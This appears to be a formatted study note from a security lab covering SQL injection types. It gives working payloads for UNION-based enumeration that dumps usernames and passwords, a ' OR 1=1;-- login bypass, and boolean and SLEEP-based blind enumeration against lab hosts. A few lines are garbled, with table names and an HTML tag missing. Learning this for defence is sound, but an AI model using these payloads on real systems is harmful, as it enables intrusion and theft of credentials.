## SQL Injection

SQL Injection is a type of attack on web applications where an attacker executes malicious queries that communicate between the backend server and the person injecting them. This can lead to the exposure of private customer data stored on the website. It is one of the oldest web application vulnerabilities and is still seen on several websites. It is also one of the most damaging web application vulnerabilities.

For performing SQL injection, you should have basic knowledge about SQL, such as commands to see tables and the data stored in them. The most common commands are:

- `select * from ;`
- `select username, password from ;`
- `select * from  where username='admin';`
- `select * from  where username like 'a%';`
- `delete from ;`

SQL injection can be broadly classified into three types:
- In-Band
- Blind
- Out-of-Band

### In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit. "In-Band" means the same communication method is used for both exploiting the vulnerability and receiving the results. For example, after identifying an SQL Injection vulnerability on a webpage, you can extract data from the database and receive it on the same page.

#### Error-Based SQL Injection

This type is particularly useful for obtaining information about the database structure since error messages from the database are printed directly to the browser screen. These can often reveal information about the entire database.

#### Union-Based SQL Injection

This method uses the SQL `UNION` operator with a `SELECT` statement to return additional results to the page. It is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

To identify whether a web application has this vulnerability, modify the request by adding either a single quote `'` or a double quote `"` at the end of a header request and check the error that returns. If you get a syntax-related error, you know your input is talking to the backend and you can proceed to perform SQL injection.

There are several payloads that provide different information and can help when dealing with large databases that are too big to inspect with just basic commands.

#### Example Process

The first thing is to return data to the browser without displaying an error message by using the `UNION` operator:

1. Try the mock browser's `id` parameter as:
    ```
    1 UNION SELECT 1
    ```
    This should produce an error message about differing numbers of columns.

2. Try adding another column:
    ```
    1 UNION SELECT 1,2
    ```
    If you still get an error, add another column:
    ```
    1 UNION SELECT 1,2,3
    ```
    If the error message is gone and the page displays an article, you have the right number of columns.

3. To return just your data, force the first query to return no results, by changing the ID to 0:
    ```
    0 UNION SELECT 1,2,3
    ```
    Now you'll see the page displays the result from the UNION select, showing values 1, 2, and 3.

4. To get the database name:
    ```
    0 UNION SELECT 1,2,database()
    ```
    You'll see the database name where "3" was previously displayed.

5. To list the tables in this database:
    ```
    0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
    ```
    - `group_concat()` combines column values into a comma-separated string.
    - `information_schema` is a special database containing metadata.

6. To get the structure of a specific table (`staff_users`):
    ```
    0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
    ```

7. To list user information from the `staff_users` table:
    ```
    0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '') FROM staff_users
    ```
    - The `` tag puts each result on a separate line for easier reading.

### Blind SQL Injection

Unlike In-Band SQL injection, Blind SQLi provides little or no feedback about whether your injected queries were successful. This is because error messages are disabled, but injection is still possible.

#### Authentication Bypass

A common blind SQL injection technique is bypassing authentication in login forms. Here, the attacker isn't interested in data retrieval but simply in getting past the login check.

For example, given this backend logic:
```
select * from users where username='%username%' and password='%password%' LIMIT 1;
```
Entering this into the password field:
```
' OR 1=1;--
```
Produces:
```
select * from users where username='' and password='' OR 1=1;
```
Since `1=1` is always true, the application will erroneously grant access.

#### Boolean-Based SQL Injection

Boolean-based SQL Injection relies on the application's behavior in response to true or false conditions. With only yes/no (or equivalent) feedback, an attacker can still enumerate the structure and contents of the database.

**Example:**

- The endpoint `https://website.thm/checkuser?username=admin` returns `{"taken":true}` if the username "admin" exists, and `{"taken":false}` otherwise.

- The SQL logic:
    ```
    select * from users where username='%username%' LIMIT 1;
    ```
- To discover the number of columns:
    ```
    admin123' UNION SELECT 1;--
    admin123' UNION SELECT 1,2,3;--
    ```
    When `taken=true`, you know you've matched the correct number of columns (here, 3 columns).

- To enumerate the database name:
    ```
    admin123' UNION SELECT 1,2,3 where database() like '%';--
    ```
    You then work through each character by iterating the like value, e.g., `'s%'`, to discover the name.

- The same process can enumerate tables, columns, users, and passwords by carefully adjusting payloads and interpreting true/false feedback.

#### Example Values (as found during enumeration):

- **Database:** sqli_four
- **Filename:** analytics
- **Username:** admin
- **Password:** 4961

### Time-Based Blind SQL Injection

Time-based blind SQLi is similar to boolean-based but with no visible feedback at allâ€”only response time is used. This is achieved using SQL functions like `SLEEP(x)` in payloads.

For example, to determine the number of columns:
```
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--
```
If the server response is delayed by 5 seconds, the injected query has been executed, and you know the number of columns that works.

To find a table name:
```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
The same enumeration logic from boolean-based SQL Injection applies.

### Out-of-Band SQL Injection

Out-of-Band (OOB) SQL Injection depends on specific features being enabled in the database or application logic where the server sends data to an external system controlled by the attacker.

The process:

1. The attacker sends a request to a vulnerable website with an injection payload.
2. The site makes a back-end SQL query that includes the attacker's payload.
3. The payload causes the site server to send HTTP/DNS requests to an external system controlled by the attacker, exporting the data.

*This page does not modify your original words but only fixes syntax errors and formats the instructions as a `.md` (Markdown) document for clear reading.*
